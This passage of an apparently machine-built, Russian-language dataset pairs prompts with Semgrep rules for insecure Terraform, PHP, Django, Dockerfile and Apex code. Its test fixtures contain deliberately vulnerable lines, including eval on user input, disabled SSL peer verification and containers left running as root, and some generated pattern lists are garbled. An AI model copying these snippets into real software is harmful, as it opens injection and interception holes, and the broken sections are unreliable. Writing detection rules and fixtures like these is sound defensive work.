    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-fsx-windows-encrypted-with-cmk.tf\nresource \"aws_fsx_windows_file_system\" \"pass\" {\n  active_directory_id = aws_directory_service_directory.test.id\n  kms_key_id          = aws_kms_key.test1.arn\n  skip_final_backup   = true\n  storage_capacity    = 32\n  subnet_ids          = [aws_subnet.test1.id]\n  throughput_capacity = 8\n}\n# ruleid: aws-fsx-windows-encrypted-with-cmk\nresource \"aws_fsx_windows_file_system\" \"fail\" {\n  active_directory_id = aws_directory_service_directory.test.id\n  skip_final_backup   = true\n  storage_capacity    = 32\n  subnet_ids          = [aws_subnet.test1.id]\n  throughput_capacity = 8\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_fsx_windows_file_system\" \"fail\" { ... }\n• resource \"aws_fsx_windows_file_system\" \"another_fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_fsx_windows_file_system\" \"pass\" { kms_key_id = aws_kms_key.test1.arn }\n• resource \"aws_fsx_windows_file_system\" \"safe\" { kms_key_id = aws_kms_key.test2.arn }\n\nЛегенда аннотаций:\n- // ruleid:aws-fsx-windows-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-fsx-windows-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-fsx-windows-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"aws_fsx_windows_file_system\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_fsx_windows_file_system\" $ANYTHING {\n        ...\n        kms_key_id = ...\n        ...\n      }\n  message: >-\n    Ensure FSX Windows file system is encrypted at rest using KMS CMKs. CMKs gives you control over the\n    encryption key in terms of access and rotation.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS FSX Windows файловой системы, которые не используют идентификатор ключа управления ключами (kms_key_id) для шифрования при хранении. Паттерн ищет ресурсы fsx_windows_file_system без явного указания kms_key_id внутри блока ресурса. Это может привести к тому, что данные будут храниться незашифрованными или зашифрованными с использованием ключей, управление которыми не контролируется пользователем.\n\n# Ключевые элементы:\n- ID: aws-fsx-windows-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-fsx-windows-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: gcp-dns-key-specs-rsasha1\nОписание уязвимости: Ensure that RSASHA1 is not used for the zone-signing and key-signing keys in Cloud DNS DNSSEC\t\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-dns-key-specs-rsasha1.tf\n# fail\n# ruleid: gcp-dns-key-specs-rsasha1\nresource \"google_dns_managed_zone\" \"fail\" {\n    name        = \"example-zone\"\n    dns_name    = \"example-de13he3.com.\"\n    description = \"Example DNS zone\"\n    dnssec_config {\n        state = on\n        default_key_specs {\n            algorithm  = \"rsasha1\"\n            key_length = 1024\n            key_type   = \"zoneSigning\"\n        }\n        default_key_specs {\n            algorithm = \"rsasha1\"\n            key_length = 2048\n            key_type = \"keySigning\"\n        }\n    }\n}\n\n# ok: gcp-dns-key-specs-rsasha1\nresource \"google_dns_managed_zone\" \"success\" {\n    name        = \"example-zone\"\n    dns_name    = \"example-de13he3.com.\"\n    description = \"Example DNS zone\"\n    dnssec_config {\n        state = on\n        default_key_specs {\n            algorithm  = \"rsasha256\"\n            key_length = 1024\n            key_type   = \"zoneSigning\"\n        }\n        default_key_specs {\n            algorithm = \"rsasha256\"\n            key_length = 2048\n            key_type = \"keySigning\"\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_dns_managed_zone\" \"fail\" { ... dnssec_config { ... default_key_specs { algorithm = \"rsasha1\" key_type = \"zoneSigning\" ... } ... } ... }\n• resource \"google_dns_managed_zone\" \"fail\" { ... dnssec_config { ... default_key_specs { algorithm = \"rsasha1\" key_type = \"keySigning\" ... } ... } ... }\n\nБезопасные паттерны:  \n• resource \"google_dns_managed_zone\" \"success\" { ... dnssec_config { ... default_key_specs { algorithm = \"rsasha256\" key_type = \"zoneSigning\" ... } ... } ... }\n• resource \"google_dns_managed_zone\" \"success\" { ... dnssec_config { ... default_key_specs { algorithm = \"rsasha256\" key_type = \"keySigning\" ... } ... } ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-dns-key-specs-rsasha1: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-dns-key-specs-rsasha1: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-dns-key-specs-rsasha1\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_dns_managed_zone\" \"...\" {\n      ...\n      dnssec_config {\n          ...\n          default_key_specs {\n              ...\n              algorithm  = \"rsasha1\"\n              key_type   = \"zoneSigning\"\n              ...\n          }\n          ...\n      }\n      ...\n      }\n  - pattern-inside: |\n      resource \"google_dns_managed_zone\" \"...\" {\n      ...\n      dnssec_config {\n          ...\n          default_key_specs {\n              ...\n              algorithm  = \"rsasha1\"\n              key_type   = \"keySigning\"\n              ...\n          }\n          ...\n      }\n      ...\n      }\n  message: >-\n    Ensure that RSASHA1 is not used for the zone-signing and key-signing keys in Cloud DNS DNSSEC\t\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма подписи RSASHA1 в настройках зоны Google Cloud DNS. Анализ выполняется путем поиска шаблонов HCL-кода, которые содержат ресурс google_dns_managed_zone с секцией dnssec_config, внутри которой указаны настройки ключей с алгоритмом rsasha1 и типом ключа либо 'zoneSigning', либо 'keySigning'. Правило применимо только к файлам с расширением .tf, написанным на языке HCL.\n\n# Ключевые элементы:\n- ID: gcp-dns-key-specs-rsasha1\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-dns-key-specs-rsasha1",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения useless-ternary\nОписание уязвимости: It looks like no matter how $CONDITION is evaluated, this expression returns $ANS. This is probably a copy-paste error.\nCWE: \nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: useless-ternary.tsx\n// ruleid:useless-ternary\ncard.id.includes(\":\") ? `/r/${card.id}` : `/r/${card.id}`\n\n// ok\ncard.id.includes(\":\") ? `/s/${card.id}` : `/r/${card.id}`  # Ограничиваем длину\n\nОпасные паттерны:\n• card.id.includes(\\\n• ) ? \\\n•  : \\\n\nБезопасные паттерны:  \n• card.id.includes(\\\n• ) ? \\\n•  : \\\n\nЛегенда аннотаций:\n- // ruleid:useless-ternary: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:useless-ternary: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: useless-ternary\n    pattern: |\n      $CONDITION ? $ANS : $ANS\n    message:\n      It looks like no matter how $CONDITION is evaluated, this expression returns $ANS. This is probably a copy-paste\n      error.\n    languages:\n      - typescript\n      - javascript\n    metadata:\n      category: correctness\n      technology:\n        - react\n    severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска выражений тернарной операции, где независимо от результата условия ($CONDITION) всегда возвращается одно и то же значение ($ANS). Это может указывать на ошибку копирования-вставки, когда разработчик случайно использовал одинаковое значение в обоих ветвях оператора тернарной операции.\n\n# Ключевые элементы:\n- ID: useless-ternary\n- Язык: typescript \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "useless-ternary",
      "language": "typescript",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: gcp-bigquery-table-encrypted-with-cmk\nОписание уязвимости: Ensure Big Query Tables are encrypted with Customer Supplied Encryption Keys (CSEK)\t\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-bigquery-table-encrypted-with-cmk.tf\n# fail\n# ruleid: gcp-bigquery-table-encrypted-with-cmk\nresource \"google_bigquery_table\" \"fail\" {\n  dataset_id = google_bigquery_dataset.default.dataset_id\n  table_id   = \"sheet\"\n\n  external_data_configuration {\n    autodetect    = true\n    source_format = \"GOOGLE_SHEETS\"\n\n    google_sheets_options {\n      skip_leading_rows = 1\n    }\n\n    source_uris = [\n      \"https://docs.google.com/spreadsheets/d/123456789012345\",\n    ]\n  }\n}\n\n# ok: gcp-bigquery-table-encrypted-with-cmk\nresource \"google_bigquery_table\" \"pass\" {\n  dataset_id = google_bigquery_dataset.default.dataset_id\n  table_id   = \"sheet\"\n\n  external_data_configuration {\n    autodetect    = true\n    source_format = \"GOOGLE_SHEETS\"\n\n    google_sheets_options {\n      skip_leading_rows = 1\n    }\n\n    source_uris = [\n      \"https://docs.google.com/spreadsheets/d/123456789012345\",\n    ]\n  }\n\n  encryption_configuration {\n    kms_key_name = var.kms_key_name\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_bigquery_table\" \"fail\" { ... }\n• resource \"google_bigquery_table\" \"another_fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"google_bigquery_table\" \"pass\" { ... encryption_configuration { kms_key_name = var.kms_key_name } ... }\n• resource \"google_bigquery_table\" \"secure\" { ... encryption_configuration { kms_key_name = \"projects/my-project/locations/global/keyRings/my-key-ring/cryptoKeys/my-key\" } ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-bigquery-table-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-bigquery-table-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-bigquery-table-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"google_bigquery_table\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"google_bigquery_table\" $ANYTHING {\n        ...\n        encryption_configuration {\n          ...\n          kms_key_name = ...\n          ...\n        }\n        ...\n      }\n  message: >-\n    Ensure Big Query Tables are encrypted with Customer Supplied Encryption Keys (CSEK)\t\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - gcp\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google BigQuery Table в Terraform конфигурациях, которые не используют шифрование с использованием ключей управления ключами (Customer Managed Encryption Keys, CSEK). Правило ищет ресурсы bigquery_table и проверяет наличие блока encryption_configuration с атрибутом kms_key_name внутри него. Если такой блок отсутствует, то ресурс считается небезопасным и генерируется предупреждение.\n\n# Ключевые элементы:\n- ID: gcp-bigquery-table-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-bigquery-table-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения curl-ssl-verifypeer-off\nОписание уязвимости: SSL verification is disabled but should not be (currently CURLOPT_SSL_VERIFYPEER= $IS_VERIFIED)\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: curl-ssl-verifypeer-off.php\n<?php\n\n$ch = curl_init();\n\ncurl_setopt($ch, CURLOPT_URL, \"http://www.example.com/\");\ncurl_setopt($ch, CURLOPT_HEADER, 0);\n\n// ruleid: curl-ssl-verifypeer-off\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n\n// ok: curl-ssl-verifypeer-off\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);  # Ограничиваем длину\n\nОпасные паттерны:\n• curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n• curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);\n• curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, null);\n\nБезопасные паттерны:  \n• curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);\n• curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);\n• curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 'true');\n\nЛегенда аннотаций:\n- // ruleid:curl-ssl-verifypeer-off: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:curl-ssl-verifypeer-off: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: curl-ssl-verifypeer-off\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $ARG = $IS_VERIFIED;\n        ...\n        curl_setopt(..., CURLOPT_SSL_VERIFYPEER, $ARG);\n    - pattern: curl_setopt(..., CURLOPT_SSL_VERIFYPEER, $IS_VERIFIED)\n  - metavariable-regex:\n      metavariable: $IS_VERIFIED\n      regex: 0|false|null\n  message: >-\n    SSL verification is disabled but should not be (currently CURLOPT_SSL_VERIFYPEER=\n    $IS_VERIFIED)\n  metadata:\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    references:\n    - https://www.saotn.org/dont-turn-off-curlopt_ssl_verifypeer-fix-php-configuration/\n    category: security\n    technology:\n    - php\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n  languages: [php]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции curl_setopt с параметром CURLOPT_SSL_VERIFYPEER, установленным в значение, отключающее проверку сертификата SSL (например, false, 0 или null). Правило использует комбинацию шаблонов, включающих прямое указание CURLOPT_SSL_VERIFYPEER и косвенное через переменную, чье значение проверяется регулярным выражением. Если значение переменной равно 0, false или null, то предполагается, что проверка SSL отключена и выводится предупреждение о возможной уязвимости.\n\n# Ключевые элементы:\n- ID: curl-ssl-verifypeer-off\n- Язык: php \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "curl-ssl-verifypeer-off",
      "language": "php",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: eval-use\nОписание уязвимости: Evaluating non-constant commands. This can lead to command injection.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: eval-use.php\n<?php\n\n// ruleid: eval-use\neval($user_input);\n\n// ok: eval-use\neval('echo \"OK\"');  # Ограничиваем длину\n\nОпасные паттерны:\n• eval($user_input);\n• eval($_GET['input']);\n• eval(file_get_contents('user_file'));\n\nБезопасные паттерны:  \n• eval('echo \"OK\"');\n• eval(\"echo 'OK';\")\n• eval('echo \"Hello, world!\";');\n\nЛегенда аннотаций:\n- // ruleid:eval-use: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:eval-use: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: eval-use\n  patterns:\n  - pattern: eval(...);\n  - pattern-not: eval('...');\n  message: >-\n    Evaluating non-constant commands. This can lead to command injection.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    references:\n    - https://www.php.net/manual/en/function.eval\n    - https://github.com/FloeDesignTechnologies/phpcs-security-audit/blob/master/Security/Sniffs/BadFunctions/NoEvalsSniff.php\n    category: security\n    technology:\n    - php\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages: [php]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции eval() в PHP-коде, где первый аргумент не является константой. Паттерн ищет вызов функции eval(), за которым следует точка с запятой, исключая случаи, когда строка аргумента eval() заключена в одинарные кавычки. Это позволяет обнаружить потенциально опасные команды, которые могут быть выполнены при передаче пользователем ввода.\n\n# Ключевые элементы:\n- ID: eval-use\n- Язык: php \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "eval-use",
      "language": "php",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: filter-with-is-safe\nОписание уязвимости: Detected Django filters flagged with 'is_safe'. 'is_safe' tells Django not to apply escaping on the value returned by this filter (although the input is escaped). Used improperly, 'is_safe' could expose your application to cross-site scripting (XSS) vulnerabilities. Ensure this filter does not 1) add HTML characters, 2) remove characters, or 3) use external data in any way. Consider instead removing 'is_safe' and explicitly marking safe content with 'mark_safe()'.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: filter-with-is-safe.py\n# cf. https://github.com/django/django/blob/ecaac9e42f497be04ddc72dfebb6e397ccca9517/django/contrib/humanize/templatetags/humanize.py\n\nimport re\nfrom datetime import date, datetime\nfrom decimal import Decimal\n\nfrom django import template\nfrom django.template import defaultfilters\nfrom django.utils.formats import number_format\nfrom django.utils.safestring import mark_safe\nfrom django.utils.timezone import is_aware, utc\nfrom django.utils.translation import (\n    gettext as _, gettext_lazy, ngettext, ngettext_lazy, npgettext_lazy,\n    pgettext, round_away_from_one,\n)\n\nregister = template.Library()\n\n# ruleid:filter-with-is-safe\n@register.filter(is_safe=True)\ndef ordinal(value):\n    \"\"\"\n    Convert an integer to its ordinal as a string. 1 is '1st', 2 is '2nd',\n    3 is '3rd', etc. Works for any integer.\n    \"\"\"\n    try:\n        value = int(value)\n    except (TypeError, ValueError):\n        return value\n    if value % 100 in (11, 12, 13):\n        # Translators: Ordinal format for 11 (11th), 12 (12th), and 13 (13th).\n        value = pgettext('ordinal 11, 12, 13', '{}th').format(value)\n    else:\n        templates = (\n            # Translators: Ordinal format when value ends with 0, e.g. 80th.\n            pgettext('ordinal 0', '{}th'),\n            # Translators: Ordinal format when value ends with 1, e.g. 81st, except 11.\n            pgettext('ordinal 1', '{}st'),\n            # Translators: Ordinal format when value ends with 2, e.g. 82nd, except 12.\n            pgettext('ordinal 2', '{}nd'),\n            # Translators: Ordinal format when value ends with 3, e.g. 83th, except 13.\n            pgettext('ordinal 3', '{}rd'),\n            # Translators: Ordinal format when value ends with 4, e.g. 84th.\n            pgettext('ordinal 4', '{}th'),\n            # Translators: Ordinal format when value ends with 5, e.g. 85th.\n            pgettext('ordinal 5', '{}th'),\n            # Translators: Ordinal format when value ends with 6, e.g. 86th.\n             # Ограничиваем длину\n\nОпасные паттерны:\n• @register.filter(is_safe=True)\ndef ordinal(value):\n    ...\n\n• @register.filter(is_safe=True)\ndef intcomma(value, use_l10n=True):\n    ...\n\n• @register.filter(is_safe=True)\ndef apnumber(value):\n    ...\n\n\nБезопасные паттерны:  \n• @register.filter(is_safe=False)\ndef intword(value):\n    ...\n\n• @register.filter(expects_localtime=True,is_safe=False)\ndef naturalday(value, arg=None):\n    ...\n\n• @register.filter\ndef naturaltime(value):\n    ...\n\n\nЛегенда аннотаций:\n- // ruleid:filter-with-is-safe: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:filter-with-is-safe: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: filter-with-is-safe\n  message: >-\n    Detected Django filters flagged with 'is_safe'. 'is_safe' tells Django\n    not to apply escaping on the value returned by this filter (although the\n    input is escaped). Used improperly, 'is_safe' could expose your application\n    to cross-site scripting (XSS) vulnerabilities. Ensure this filter does not\n    1) add HTML characters, 2) remove characters, or 3) use external data in\n    any way. Consider instead removing 'is_safe' and explicitly marking safe\n    content with 'mark_safe()'.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.1/topics/security/#cross-site-scripting-xss-protection\n    - https://docs.djangoproject.com/en/3.1/howto/custom-template-tags/#filters-and-auto-escaping\n    - https://stackoverflow.com/questions/7665512/why-use-is-safe\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - python\n  severity: WARNING\n  pattern: |-\n    @register.filter(..., is_safe=True, ...)\n    def $FILTER(...):\n      ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска Django фильтров, помеченных атрибутом 'is_safe'. Атрибут 'is_safe' указывает Django не применять экранирование значений, возвращаемых этим фильтром, хотя входные данные уже были экранированы. Неправильное использование этого атрибута может привести к уязвимостям XSS (межсайтовый скриптинг). Правило ищет декларации фильтров с атрибутом 'is_safe', где фильтр явно добавляет HTML-теги, удаляет символы или использует внешние данные. В таких случаях рекомендуется либо удалить атрибут 'is_safe', либо явно пометить безопасное содержимое с помощью функции 'mark_safe()'.\n\n# Ключевые элементы:\n- ID: filter-with-is-safe\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "filter-with-is-safe",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: last-user-is-root\nОписание уязвимости: The last user in the container is 'root'. This is a security hazard because if an attacker gains control of the container they will have root access. Switch back to another user after running commands as 'root'.\nCWE: CWE-269: Improper Privilege Management\nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: CWE-269: Improper Privilege Management\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: last-user-is-root.dockerfile\nFROM busybox\n\n\nRUN git clone https://github.com/returntocorp/semgrep\nRUN pip3 install semgrep\nRUN semgrep -f p/xss\nUSER swuser\nUSER root\n\nUSER user1\n# ruleid: last-user-is-root\nUSER root  # Ограничиваем длину\n\nОпасные паттерны:\n• USER root\nUSER root\n• USER root\nCMD [\"bash\"]\n• ARG USER=root\nUSER ${USER}\n\nБезопасные паттерны:  \n• USER root\nUSER swuser\n• USER root\nUSER user1\n• ARG USER=root\nUSER ${USER}\nUSER swuser\n\nЛегенда аннотаций:\n- // ruleid:last-user-is-root: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:last-user-is-root: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: last-user-is-root\n  patterns:\n    - pattern: USER root\n    - pattern-not-inside:\n        patterns:\n          - pattern: |\n              USER root\n              ...\n              USER $X\n          - metavariable-pattern:\n              metavariable: $X\n              patterns:\n                - pattern-not: root\n  message: >-\n    The last user in the container is 'root'. This is a security\n    hazard because if an attacker gains control of the container\n    they will have root access. Switch back to another user after\n    running commands as 'root'.\n  severity: ERROR\n  languages: \n    - dockerfile \n  metadata:\n    cwe:\n    - 'CWE-269: Improper Privilege Management'\n    source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3002\n    references:\n    - https://github.com/hadolint/hadolint/wiki/DL3002\n    category: security\n    technology:\n    - dockerfile\n    confidence: MEDIUM\n    owasp:\n    - A04:2021 - Insecure Design\n    subcategory:\n    - audit\n    likelihood: MEDIUM\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска Dockerfile, где последний пользователь установлен в 'root', что является потенциальной угрозой безопасности. Правило ищет инструкции 'USER root' и исключает случаи, когда после команды 'USER root' следует другая команда 'USER', указывающая на смену пользователя. Паттерн использует оператор 'pattern-not-inside' для исключения ситуаций, когда 'USER root' встречается непосредственно перед другой командой 'USER', которая не равна 'root'. Это позволяет обнаружить ситуации, когда контейнер запускается с привилегиями root без последующей смены пользователя.\n\n# Ключевые элементы:\n- ID: last-user-is-root\n- Язык: dockerfile \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "last-user-is-root",
      "language": "dockerfile",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: avoid-soql-in-loops\nОписание уязвимости: Database class methods, DML operations, SOQL queries, SOSL queries, Approval class methods, Email sending, async scheduling or queueing within loops can cause governor limit exceptions. Instead, try to batch up the data into a list and invoke the operation once on that list of data outside the loop.\nCWE: \nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: AvoidSoqlInLoops.cls\npublic class AvoidSoqlInLoops {\n\tpublic void SoqlInsideLoop() {\n\t\tfor (Integer i = 0; i < 151; i++) {\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tList<Account> accounts = [SELECT Id FROM Account];\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tAccount[] accounts = [SELECT Id FROM Account];\n\t\t}\n\t}\n\n\tpublic void SoqlInsideLoop2() {\n\t\tfor (Account a : accounts) {\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tList<Account> accounts = [SELECT Id FROM Account];\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tAccount[] accounts = [SELECT Id FROM Account];\n\t\t}\n\t}\n\n\tpublic void SoqlInsideLoop5() {\n\t\twhile (someCondition) {\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tList<Account> accounts = [SELECT Id FROM Account];\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tAccount[] accounts = [SELECT Id FROM Account];\n\t\t}\n\t}\n\n\tpublic void SoqlInsideLoop7() {\n\t\tdo {\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tList<Account> accounts = [SELECT Id FROM Account];\n\t\t\t// ruleid: avoid-soql-in-loops\n\t\t\tAccount[] accounts = [SELECT Id FROM Account];\n\t\t} while (someCondition);\n\t}\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• for (Integer i = 0; i < 151; i++) {\n\tList<Account> accounts = [SELECT Id FROM Account];\n}\n• for (Account a : accounts) {\n\tList<Account> accounts = [SELECT Id FROM Account];\n}\n• while (someCondition) {\n\tList<Account> accounts = [SELECT Id FROM Account];\n}\n\nБезопасные паттерны:  \n• List<Account> accounts = [SELECT Id FROM Account];\nfor (Integer i = 0; i < 151; i++) {\n\t// code\n}\n• List<Account> accounts = [SELECT Id FROM Account];\nAccount[] accounts = accounts.toArray();\nfor (Account a : accounts) {\n\t// code\n}\n• List<Account> accounts;\naccounts = [SELECT Id FROM Account];\nfor (Account a : accounts) {\n\t// code\n}\n\nЛегенда аннотаций:\n- // ruleid:avoid-soql-in-loops: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-soql-in-loops: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
